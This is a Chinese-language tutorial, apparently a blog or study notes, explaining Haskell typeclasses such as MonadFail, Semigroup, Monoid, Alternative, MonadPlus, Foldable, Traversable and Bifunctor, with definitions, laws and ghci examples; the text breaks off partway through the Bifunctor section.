Data.Traversable \u6a21\u5757\u4e2d replicateM \u00b6 replicateM :: Applicative m => Int -> m a -> m [a] mapM & forM \u00b6 mapM :: Monad m => (a -> m b) -> [a] -> m [b] forM :: Monad m => [a] -> (a -> m b) -> m [b] forM \u7684\u7528\u6cd5\u5728 IO \u90e8\u5206\u5df2\u7ecf\u8bf4\u8fc7\uff0cmapM \u548c forM \u90fd\u5728 Data.Traversable \u6a21\u5757\u4e2d\u6709\u5e7f\u6cdb\u7248\u672c \u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u51fd\u6570\uff1afilterM\u3001zipWithM\u3001foldM\u3001forever\uff0c\u901a\u8fc7\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u7528\u6cd5\uff0c\u662f\u5c06\u539f\u6765\u4ec5\u4f7f\u7528\u4e0e\u5217\u8868\u7684\u51fd\u6570\u63d0\u5347\u81f3\u53ef\u4ee5\u9002\u7528\u4e8e\u6240\u6709\u5355\u5b50 \u5e76\u4e14\u5728\u51fd\u6570\u540d\u540e\u52a0\u4e0b\u5212\u7ebf\uff0c\u6bd4\u5982 sequence_\u3001mapM_\uff0c\u4f1a\u5ffd\u7565\u8fd4\u56de\u503c\uff08\u6700\u7ec8\u7ed3\u679c\u4e3a m () \uff09 =<< & >=> & <=< \u00b6 \uff08 >=> \u64cd\u4f5c\u7b26\u5728\u4e0a\u9762 Monad Laws \u90e8\u5206\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5b9a\u4e49\uff09 - x >>= f = f =<< x - f >=> g = g <=< f MonadFail \u00b6 MonadFail \u5b9a\u4e49\u5728 Control.Monad.Fail \u6a21\u5757\u4e2d\uff1a class Monad m => MonadFail m where fail :: String -> m a \u5b83\u53ea\u8981\u6c42\u5728 Monad \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0 fail \u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u4e00\u4e2a\u5355\u5b50\u3002\u8fd9\u4f1a\u4f7f\u5728 do \u8bed\u53e5\u4e2d\u4ea7\u751f\u9519\u8bef\u65f6\u76f4\u63a5\u53d8\u4e3a\u9519\u8bef\u503c\uff08\u7a7a\u503c\uff09\u4f7f\u6700\u7ec8\u7684\u8fd4\u56de\u503c\u4e3a\u9519\u8bef\u503c MonadFail \u5b9e\u4f8b \u00b6 instance MonadFail Maybe where fail _ = Nothing instance MonadFail [] where fail _ = [] instance MonadFail IO where fail = failIO Maybe \u548c [] \u7684 fail \u51fd\u6570\u90fd\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570\u65e0\u5173\uff0c\u76f4\u63a5\u8fd4\u56de\u7a7a\u503c\uff08Nothing\u3001[]\uff09\uff1b\u800c IO \u7684 fail \u51fd\u6570\u76f4\u63a5\u4f7f\u7528 failIO\uff0c\u5b9e\u73b0\u65b9\u6cd5\u4e5f\u662f\u6df1\u5965\uff08\u63a5\u7740\u9003 exampleFail :: Maybe Char exampleFail = do ( x : xs ) <- Just \"\" return x ghci > exampleFail Nothing \u5728\u8fd9\u4e2a\u4f8b\u5b50\u7684 do \u8bed\u53e5\u4e2d\uff0c\u5728\u63d0\u53d6 Just \"\" \u4e2d\u7684\u503c\u65f6\u7528\u4e86\u6a21\u5f0f\u5339\u914d\uff0c\u4f46\u662f\u56e0\u4e3a\u5176\u5185\u5bb9\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0cx:xs \u5339\u914d\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u8fd9\u65f6\u5c31\u4f1a\u89e6\u53d1 fail \u51fd\u6570\u76f4\u63a5\u8fd4\u56de Nothing MonadFail Law \u00b6 fail s >>= m = fail s Semigroup \u00b6 \u534a\u7fa4\uff08semigroup\uff09\u662f\u4e00\u4e2a\u96c6\u5408 \\(S\\) \uff0c\u5b83\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26 \\(\\oplus\\) \uff0c\u5e76\u4e14\u6ee1\u8db3 \\[ a\\oplus b \\in S\\quad a, b\\in S \\] \u4ee5\u53ca\u7ed3\u5408\uff08associative\uff09\u5f8b\uff1a \\[ (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c) \\] \u8fd9\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\u5728 Haskell \u7684 Semigroup \u4e2d\u88ab\u5b9a\u4e49\u4e3a <> \u51fd\u6570\uff1a class Semigroup a where ( <> ) :: a -> a -> a sconcat :: NonEmpty a -> a sconcat ( a :| as ) = go a as where go b ( c : cs ) = b <> go c cs go b [] = b stimes :: Integarl b => b -> a -> a stimes = ... \u9664\u6b64\u4e4b\u5916\u8fd8\u6709 sconcat \u548c stimes \u51fd\u6570\uff0c\u90fd\u7ed9\u51fa\u4e86\u9ed8\u8ba4\u5b9e\u73b0\u3002\u5bf9\u4e8e\u5217\u8868\uff0c<> \u76f8\u5f53\u4e8e (++)\uff0cstimes \u76f8\u5f53\u4e8e concat . replicate\uff1a ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > sconcat $ fromList [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] ghci > stimes 3 [ 1 , 2 ] [ 1 , 2 , 1 , 2 , 1 , 2 ] Semigroup Law \u00b6 (x <> y) <> z = x <> (y <> z) \u8865\uff1aNonEmpty \u00b6 NonEmpty \u8868\u793a\u975e\u7a7a\u5217\u8868\uff0c\u5b9a\u4e49\u662f\uff1a data NonEmpty a = a :| [ a ] deriving ( Eq , Ord ) \u4f7f\u7528\u4e00\u4e2a\u5143\u7d20\u548c\u4e00\u4e2a\u5217\u8868\u7528 :| \u8fde\u63a5\u5c31\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a NonEmpty \u7c7b\u578b\u7684\u5217\u8868 Data.List.NonEmpty \u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5f88\u591a\u666e\u901a\u5217\u8868\u6709\u7684\u51fd\u6570\uff0c\u9700\u8981 qualified import \u540e\u8c03\u7528\uff0c\u4f7f\u7528 fromList\u3001toList \u51fd\u6570\u53ef\u4ee5\u5728\u666e\u901a\u5217\u8868\u548c\u975e\u7a7a\u5217\u8868\u4e4b\u95f4\u8f6c\u6362 ghci > import qualified Data.List.NonEmpty as NE ghci > arr = NE . fromList [ 1 , 2 , 3 ] ghci > arr 1 :| [ 2 , 3 ] ghci > NE . head arr 1 ghci > NE . tail arr [ 2 , 3 ] Monoid \u00b6 \u5e7a\u534a\u7fa4\uff08Monoid\uff09\u662f\u4e00\u4e2a\u6709\u5355\u4f4d\u5143\u7d20 \\(e\\) \u7684\u534a\u7fa4\uff0c\u5373 \\(e\\) \u6ee1\u8db3\uff1a \\[ e\\oplus x = x\\oplus e = x \\] class Semigroup a => Monoid a where mempty :: a mappend :: a -> a -> a mappend = ( <> ) mconcat :: [ a ] -> a mconcat = foldr mappend mempty \u53ef\u4ee5\u770b\u51fa Monoid \u8981\u6c42\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u6700\u5c11\u53ea\u9700\u8981 mempty \uff0c\u5b83\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5355\u4f4d\u5143\u7d20\u3002 mappend \u5373 Semigroup \u4e2d\u7684 <> \u8fd0\u7b97\u7b26\uff0c mconcat \u4e5f\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u5b9e\u73b0 Monoid \u5b9e\u4f8b \u00b6 [a] \u00b6 \u56e0\u4e3a Monoid \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u50cf Functor \u7b49\u4e00\u6837\u7b49\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6240\u4ee5 [] \u5e76\u4e0d\u662f Monoid \u7684\u5b9e\u4f8b\uff0c\u4f46\u662f\u5177\u4f53\u7c7b\u578b [a] \u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance Semigroup [ a ] where ( <> ) = ( ++ ) instance Monoid [ a ] where mempty = [] mconcat xss = [ x | xs <- xss , x <- xs ] \u5217\u8868\u7684\u5355\u4f4d\u5143\u7d20\uff08mempty\uff09\u5c31\u662f\u7a7a\u5217\u8868 []\uff0c\u8fd0\u7b97\u7b26\u5c31\u662f\u5408\u5e76\u5217\u8868 (++)\uff0cmconcat \u4e5f\u7528\u5217\u8868\u63a8\u5bfc\u91cd\u65b0\u5b9e\u73b0\u63d0\u9ad8\u6548\u7387 ghci > mempty :: [ Int ] [] ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > [ 1 , 2 ] ` mappend ` [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > mconcat [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] Ordering \u00b6 instance Semigroup Ordering where LT <> _ = LT EQ <> y = y GT <> _ = GT instance Monoid Ordering where mempty = EQ \u4e3b\u8981\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83\u5b57\u5178\u5e8f\uff1a ghci > mconcat ( zipWith compare \"abcd\" \"acbd\" ) LT Sum & Product \u00b6 \u5bf9\u4e8e\u6570\u5b57\uff0c\u52a0\u6cd5\u548c\u4e58\u6cd5\u90fd\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff0c\u6240\u4ee5\u5bf9\u4e8e Num\uff0c\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u4e0d\u80fd\u4e3a\u540c\u4e00\u7c7b\u578b\u8bbe\u7f6e\u4e24\u79cd\u5b9e\u4f8b\u65b9\u5f0f\uff0c\u6240\u4ee5 Data.Monoid \u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\u2014\u2014\u2014\u2014 Sum \u548c Product\uff1a newtype Sum a = Sum { getSum :: a } deriving ( ... ) newtype Product a = Product { getProduct :: a } deriving ( ... ) \u5b83\u4eec\u4f7f\u7528 Sum \u6216 Product \u6765\u5305\u88c5\u8d77\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u901a\u8fc7 getSum \u6216 getProduct \u6765\u83b7\u53d6\u5176\u4e2d\u7684\u503c \u5bf9\u4e8e\u52a0\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (+)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 0\uff1b\u5bf9\u4e8e\u4e58\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (*)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 1: instance Num a => Semigroup ( Sum a ) where ( <> ) = coerce (( + ) :: a -> a -> a ) instance Num a => Monoid ( Sum a ) where mempty = Sum 0 instance Num a => Semigroup ( Product a ) where ( <> ) = coerce (( * ) :: a -> a -> a ) instance Num a => Monoid ( Product a ) where mempty = Product 1 ghci > Sum 5 <> Sum 6 <> Sum 10 Sum { getSum = 21 } ghci > getSum . mconcat . fmap Sum $ [ 5 , 6 , 10 ] 21 ghci > Product 5 <> Product 6 <> Product 10 Product { getProduct = 300 } ghci > getProduct . mconcat . fmap Product $ [ 5 , 6 , 10 ] 300 All & Any \u00b6 \u548c\u6570\u5b57\u4e00\u6837\uff0c\u5e03\u5c14\u503c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u56e0\u6b64 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\uff0c\u5206\u522b\u5b9e\u73b0\u4e86\u8fd9\u4e24\u79cd Monoid\uff1a newtype All = All { getAll :: Bool } deriving ( ... ) instance Semigroup All where ( <> ) = coerce ( && ) instance Monoid All where mempty = All True newtype Any = Any { getAny :: Bool } deriving ( ... ) instance Semigroup Any where ( <> ) = coerce ( || ) instance Monoid Any where mempty = Any False ghci > getAll ( All True <> mempty <> All False ) False ghci > getAll ( mconcat ( map ( \\ x -> All ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) False ghci > getAny ( Any True <> mempty <> Any False ) True ghci > getAny ( mconcat ( map ( \\ x -> Any ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) True Monoid a => Maybe a \u00b6 \u5982\u679c a \u662f\u4e00\u4e2a(\u5e7a)\u534a\u7fa4\uff0c\u90a3\u4e48 Maybe a \u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff0c\u5355\u4f4d\u5143\u5c31\u662f Nothing\uff1a instance Semigroup a => Semigroup ( Maybe a ) where Nothing <> b = b a <> Nothing = a Just a <> Just b = Just ( a <> b ) instance Semigroup a => Monoid ( Maybe a ) where mempty = Nothing ghci > Nothing <> Just \"andy\" Just \"andy\" ghci > Just LT <> Nothing Just LT ghci > Just ( Sum 3 ) <> Just ( Sum 4 ) Just ( Sum { getSum = 7 }) First & Last \u00b6 \u5bf9\u4e8e Maybe \u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u6cd5\uff0c\u5373 <> \u64cd\u4f5c\u6bcf\u6b21\u6052\u53d6\u5de6\u8fb9\u548c\u6bcf\u6b21\u6052\u53d6\u53f3\u8fb9\uff08\u5728\u6ca1\u6709 Nothing \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u65b0\u7684\u5305\u88c5\u5668\uff1aFirst \u548c Last\uff1a newtype First a = First { getFirst :: Maybe a } deriving ( ... ) instance Semigroup ( First a ) where First Nothing <> b = b a <> _ = a instance Monoid ( First a ) where mempty = First Nothing newtype Last a = Last { getLast :: Maybe a } deriving ( ... ) instance Semigroup ( Last a ) where a <> Last Nothing = a _ <> b = b instance Monoid ( Last a ) where mempty = Last Nothing ghci > getFirst ( First ( Just \"hello\" ) <> First Nothing <> First ( Just \"world\" )) Just \"hello\" ghci > getLast ( Last ( Just \"hello\" ) <> Last Nothing <> Last ( Just \"world\" )) Just \"world\" ghci > getFirst . mconcat . map First $ [ Nothing , Just 9 , Just 10 ] Just 9 ghci > getLast . mconcat . map Last $ [ Nothing , Just 9 , Just 10 ] Just 10 Min & Max \u00b6 \u5bf9\u4e8e\u6709\u754c\u7684\u7c7b\u578b\uff0c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u6bcf\u6b21\u4e8c\u5143\u64cd\u4f5c\u90fd\u53d6\u6700\u5c0f\u6216\u6700\u5927\u3002 Data.Semigroup \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5176\u5668\uff1aMin \u548c Max\uff1a newtype Min a = Min { getMin :: a } deriving ( ... ) instance Ord a => Semigroup ( Min a ) where ( <> ) = coerce ( min :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Min a ) where mempty = maxBound newtype Max a = Max { getMax :: a } deriving ( ... ) instance Ord a => Semigroup ( Max a ) where ( <> ) = coerce ( max :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Max a ) where mempty = minBound ghci > Min 3 <> Min 5 Min { getMin = 3 } ghci > Max 3 <> Max 5 Max { getMax = 5 } ghci > getMin . mconcat . map Min $ [ 1 , 2 , 3 ] :: Int 1 ghci > getMax . mconcat . map Max $ [ 1 , 2 , 3 ] :: Int 3 \u5143\u7ec4 \u00b6 \u5f53\u5143\u7ec4\u5185\u7684\u6240\u6709\u5143\u7d20\u90fd\u662f\u5e7a\u534a\u7fa4\u65f6\uff0c\u6574\u4e2a\u5143\u7ec4\u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance ( Semigroup a , Semigroup b ) => Semigroup ( a , b ) where ( a , b ) <> ( a' , b' ) = ( a <> a' , b <> b' ) stimes n ( a , b ) = ( stimes n a , stimes n b ) instance ( Monoid a , Monoid b ) => Monoid ( a , b ) where mempty = ( mempty , mempty ) ghci > mconcat $ map ( \\ x -> ( Min x , Max x )) [ 1 .. 10 ] :: ( Min Int , Max Int ) ( Min { getMin = 1 }, Max { getMax = 10 }) Monoid Laws \u00b6 mempty <> x = x x <> mempty = x (x <> y) <> z = x <> (y <> z) Monoidal classes \u00b6 Applicative\u3001Monad\u3001Arrow \u90fd\u6709\u6709\u5e7a\u534a\u7fa4\u6027\u8d28\u7684\u5b50\u7c7b\u578b\u7c7b\uff0c\u5206\u522b\u662f Alternative\u3001MonadPlus\u3001ArrowPlus Alternative \u00b6 class Applicative f => Alternative f where -- | The identity of '<|>' empty :: f a -- | An associative binary operation ( <|> ) :: f a -> f a -> f a some :: f a -> f [ a ] some v = ( : ) <$> v <*> many v many :: f a -> f [ a ] many v = some v <|> pure [] \u5176\u4e2d empty \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u5355\u4f4d\u5143\u7d20\uff0c<|> \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u4e8c\u5143\u8fd0\u7b97\u7b26\u3002some \u548c many \u662f\u4e24\u4e2a\u51fd\u6570\uff08 \u610f\u4e49\u8fd8\u4e0d\u61c2 \uff09 Alternative \u5b9e\u4f8b \u00b6 [] \u00b6 instance Alternative [] where empty = [] ( <|> ) = ( ++ ) \u548c Monoid \u4e00\u6837\uff0c\u5355\u4f4d\u5143\u7d20\u662f\u7a7a\u5217\u8868\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u5217\u8868\u5408\u5e76 ghci > [ 1 , 2 , 3 ] <|> empty <|> [ 4 , 5 ] [ 1 , 2 , 3 , 4 , 5 ] ghci > some [] [] ghci > many [] [ [] ] Maybe \u00b6 instance Alternative Maybe where empty = Nothing Nothing <|> r = r l <|> _ = l Maybe \u4f5c\u4e3a Alternative \u7684\u5355\u4f4d\u5143\u7d20\u662f Nothing\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u59cb\u7ec8\u53d6\u5de6\u8fb9\uff08\u5f53\u5de6\u8fb9\u4e0d\u4e3a Nothing \u65f6\uff09 ghci > Nothing <|> Just 1 <|> Just 2 Just 1 ghci > some Nothing Nothing ghci > many Nothing Just [] ZipList \u00b6 instance Alternative ZipList where empty = ZipList [] ZipList xs <|> ZipList ys = ZipList ( xs ++ drop ( length xs ) ys ) <> getZipList $ ZipList [ 1 , 2 ] <|> ZipList [ 3 , 4 , 5 , 6 ] [ 1 , 2 , 5 , 6 ] <> getZipList $ ZipList [ 1 , 2 , 3 , 4 ] <|> ZipList [ 3 , 4 , 5 , 6 ] [ 1 , 2 , 3 , 4 ] Alternative Laws \u00b6 Monoid laws : empty <|> x = x x <|> empty = x ( x <|> y ) <|> z = x <|> ( y <|> z ) Left zero law \uff1aempty <*> f = empty \u4ee5\u4e0a\u7684\u5b9a\u5f8b\u662f\u90fd\u6ee1\u8db3\u90fd\uff0c\u4e0b\u9762\u7684\u5b9a\u5f8b\u53ea\u6709\u90e8\u5206\u6ee1\u8db3\uff1a Right zero law \uff1af <*> empty = empty \uff08\u5927\u90e8\u5206\u5305\u62ec Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u4e0d\u6ee1\u8db3\uff09 Left distribution \uff1a(a <|> b) < > c = (a < > c) <|> (b <*> c) \uff08Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u53ca\u5927\u90e8\u5206 parsers \u4e0d\u6ee1\u8db3\uff09 Right distribution \uff1aa < > (b <|> c) = (a < > b) <|> (a <*> c) \uff08\u5927\u90e8\u5206\u4e0d\u6ee1\u8db3\uff0c\u4f46 Maybe \u6ee1\u8db3\uff09 Left catch \uff1a(pure a) <|> x = pure a \uff08Maybe\u3001IO\u3001parsers \u6ee1\u8db3\uff0c\u4f46 [] \u4e0d\u6ee1\u8db3\uff09 \u5e38\u7528\u51fd\u6570 \u00b6 asum :: (Foldable t, Alternative f) => t (f a) -> f a\uff0c\u76f8\u5f53\u4e8e foldr (<|>) empty\uff1a ghci > asum [ Nothing , Just 5 , Just 3 ] Just 5 ghci > asum [[ 2 ],[ 3 ],[ 4 , 5 ]] [ 2 , 3 , 4 , 5 ] guard :: (Alternative f) => Bool -> f ()\uff1a guard True = pure () guard False = empty MonadPlus \u00b6 class ( Alternative m , Monad m ) => MonadPlus m where mzero :: m a mzero = empty mplus :: m a -> m a -> m a mplus = ( <|> ) MonadPlus\u5b9e\u4f8b \u00b6 []\u3001Maybe \u90fd\u662f MonadPlus \u7684\u5b9e\u4f8b\uff0cmzero \u548c mplus \u90fd\u7531 Alternative \u5b9e\u73b0 MonadPlus Laws \u00b6 Monoid laws Left zero \uff1amzero >>= f = mzero Right zero \uff1am >> mzero = mzero \u5e38\u7528\u51fd\u6570 \u00b6 msum = asum mfilter \uff1a mfilter p ma = do a <- ma if p a then return a else mzero ArrowPlus \u00b6 ArrowZero \u548c ArrowPlus \u5206\u522b\u4e3a Arrow \u8bbe\u7f6e\u4e86 Monoid \u4e2d\u7684\u5355\u4f4d\u5143\u7d20\u548c\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u4f7f\u4e4b\u6210\u4e3a\u4e86\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a class Arrow arr => ArrowZero arr where zeroArrow :: b ` arr ` c class ArrowZero arr => ArrowPlus arr where ( <+> ) :: ( b ` arr ` c ) -> ( b ` arr ` c ) -> ( b ` arr ` c ) \u4e00\u4e9b\u5176\u5b83 Typeclasses \u00b6 Foldable \u00b6 Foldable \u662f\u8868\u793a\u53ef\u4ee5\u6298\u53e0\uff08fold\uff09\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Foldable \u4e2d\u5b9a\u4e49\uff0c\u8fd9\u4f7f\u5f97\u548c fold \u76f8\u5173\u7684\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u610f Foldable \u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0a\u3002\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class Foldable t where fold :: Monoid m => t m -> m foldMap :: Monoid m => ( a -> m ) -> t a -> m foldMap' :: Monoid m => ( a -> m ) -> t a -> m foldr :: ( a -> b -> b ) -> b -> t a -> b foldr' :: ( a -> b -> b ) -> b -> t a -> b foldl :: ( b -> a -> b ) -> b -> t a -> b foldl' :: ( b -> a -> b ) -> b -> t a -> b foldr1 :: ( a -> a -> a ) -> t a -> a foldl1 :: ( a -> a -> a ) -> t a -> a toList :: t a -> [ a ] null :: t a -> Bool length :: t a -> Int elem :: Eq a => a -> t a -> Bool maximum :: Ord a => t a -> a minimum :: Ord a => t a -> a sum :: Num a => t a -> a product :: Num a => t a -> a {-# MINIMAL foldMap | foldr #-} \u6700\u5c11\u53ea\u8981\u5b9e\u73b0 foldr \u548c foldMap \u5176\u4e2d\u4e4b\u4e00\u5c31\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff0c\u5176\u5b83\u7684\u51fd\u6570\u90fd\u6709\u7531\u8fd9\u4e24\u4e2a\u51fd\u6570\u63d0\u4f9b\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u800c\u4e14\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u4e5f\u6709\u76f8\u4e92\u5b9e\u73b0\u3002\u56e0\u6b64\u53ea\u8981\u5b9e\u73b0 foldr \u6216 foldMap \u4e00\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u5176\u5b83 Foldable \u4e2d\u7684\u51fd\u6570\u3002foldr \u51fd\u6570\u5728\u524d\u9762\u5df2\u7ecf\u6709\u5b66\u8fc7\uff0cfoldMap \u7684\u4f8b\u5b50\u662f\uff1a ghci > foldMap Sum [ 1 , 3 , 5 ] Sum { getSum = 9 } ghci > foldMap Product [ 1 , 3 , 5 ] Product { getProduct = 15 } ghci > foldMap ( replicate 3 ) [ 1 , 2 , 3 ] [ 1 , 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 ] Foldable \u5b9e\u4f8b \u00b6 []\u3001Maybe\u3001Either a\u3001(,) a \u90fd\u662f Foldable \u7684\u5b9e\u4f8b\uff0c\u6807\u51c6\u5bb9\u5668\u5e93\u4e2d\u7684 Map\u3001Set \u7b49\u4e5f\u90fd\u662f Foldable \u7684\u5b9e\u4f8b\u3002\u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e8c\u53c9\u6811\u7c7b\u578b\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff1a data Tree a = Empty | Leaf a | Node ( Tree a ) a ( Tree a ) instance Foldable Tree where foldMap :: Monoid m => ( a -> m ) -> Tree a -> m foldMap f Empty = mempty foldMap f ( Leaf x ) = f x foldMap f ( Node l k r ) = foldMap f l ` mappend ` f k ` mappend ` foldMap f r \u5e38\u7528\u51fd\u6570 \u00b6 asum :: (Alternative f, Foldable t) => t (f a) -> f a\uff0c\u7528 <|> \u9010\u4e2a\u8fde\u63a5\u6240\u6709\u5143\u7d20 sequenceA_ :: (Applicative f, Foldable t) => t (f a) -> f ()\uff0c\u7531\u4e8e\u4e22\u5f03\u7ed3\u679c\uff0c\u6240\u4ee5 Foldable t \u5c31\u53ef\u4ee5\u6ee1\u8db3\uff1b\u56e0\u6b64\u4e0d\u540c\u4e8e sequenceA \u9700\u8981 Traversable traverse_ :: (Applicative f, Foldable t) => (a -> f b) -> t a -> f () for_ :: (Applicative f, Foldable t) => t a -> (a -> f b) -> f () Traversable \u00b6 Traversable \u662f\u8868\u793a\u53ef\u904d\u5386\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Traversable \u6a21\u5757\u4e2d\u5b9a\u4e49\uff0c\u5b83\u662f Foldable \u7684\u5347\u7ea7\u7248\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a Functor\uff0c\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class ( Functor t , Foldable t ) => Traversable t where traverse :: Applicative f => ( a -> f b ) -> t a -> f ( t b ) sequenceA :: Applicative f => t ( f a ) -> f ( t a ) mapM :: Monad m => ( a -> m b ) -> t a -> m ( t b ) sequence :: Monad m => t ( m a ) -> m ( t a ) {-# MINIMAL traverse | sequenceA #-} \u6700\u5c11\u53ea\u9700\u8981\u5b9e\u73b0 traverse \u51fd\u6570\u6216\u8005 sequenceA \u51fd\u6570\u3002\u5176\u4e2d\u5404\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u901a\u8fc7\u7c7b\u578b\u7b7e\u540d\u4e5f\u90fd\u80fd\u63a8\u6d4b\u51fa\u6765\u3002\u4f46\u662f\u5176\u4e2d mapM \u5c31\u662f traverse\uff0csequence \u5c31\u662f sequenceA\uff0c\u5b83\u4eec\u5b58\u5728\u53ea\u662f\u5386\u53f2\u9057\u7559 Traversable \u5b9e\u4f8b \u00b6 instance Traversable Maybe where traverse _ Nothing = pure Nothing traverse f ( Just x ) = Just <$> f x instance Traversable [] where {-# INLINE traverse #-} traverse f = foldr cons_f ( pure [] ) where cons_f x ys = liftA2 ( : ) ( f x ) ys instance Traversable ( Either a ) where traverse _ ( Left x ) = pure ( Left x ) traverse f ( Right y ) = Right <$> f y instance Traversable ((,) a ) where traverse f ( x , y ) = (,) x <$> f y ... \u4e0a\u9762\u7684 Tree \u4e5f\u53ef\u4ee5\u6210\u4e3a Traversable \u7684\u5b9e\u4f8b\uff1a instance Functor Tree where fmap :: ( a -> b ) -> Tree a -> Tree b fmap g Empty = Empty fmap g ( Leaf x ) = Leaf $ g x fmap g ( Node l x r ) = Node ( fmap g l ) ( g x ) ( fmap g r ) instance Traversable Tree where traverse :: Applicative f => ( a -> f b ) -> Tree a -> f ( Tree b ) traverse g Empty = pure Empty traverse g ( Leaf x ) = Leaf <$> g x traverse g ( Node l x r ) = Node <$> traverse g l <*> g x <*> traverse g r Traversable Laws \u00b6 Traversable \u4e5f\u6709\u4e24\u6761\u5b9a\u5f8b\uff1a 1. traverse Identity = Identity 2. traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f \u5176\u4e2d Identity \u548c Compose \u5206\u522b\u5b9a\u4e49\u5728 Data.Functor.Identity \u548c Data.Functor.Compose \u4e24\u4e2a\u6a21\u5757\u4e2d\uff1a newtype Identity a = Identity { runIdentity :: a } deriving ( ... ) newtype Compose f g a = Compose { getCompose :: f ( g a ) } deriving ( ... ) Bifunctor \u00b6 Functor \u7684\u5b9e\u4f8b\u7684 kind \u90fd\u662f * -> *\uff0c\u56e0\u6b64 fmap \u53ea\u80fd\u5c06\u4e00\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u4e0a\u3002\u800c Bifunctor\uff08\u5728 Data.Bifunctor \u6a21\u5757\u4e2d\u5b9a\u4e49\uff09\u7684\u5b9e\u4f8b\u7684 kind \u662f * -> * -> *\uff0c\u800c\u4e14\u5b83\u7684 bimap \u53ef\u4ee5\u540c\u65f6\u5c06\u4e24\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e24\u4e2a\u503c\u4e0a\uff1a class Bifunctor p where bimap :: ( a -> b ) -> ( c -> d ) -> p a c -> p b d first :: ( a -> b ) -> p a c -> p b c second :: ( b -> c ) -> p a b -> p a c {-# MINIMAL bimap | first, second #-} \u540c\u65f6 bimap \u548c first,second \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\uff1a bimap f g = 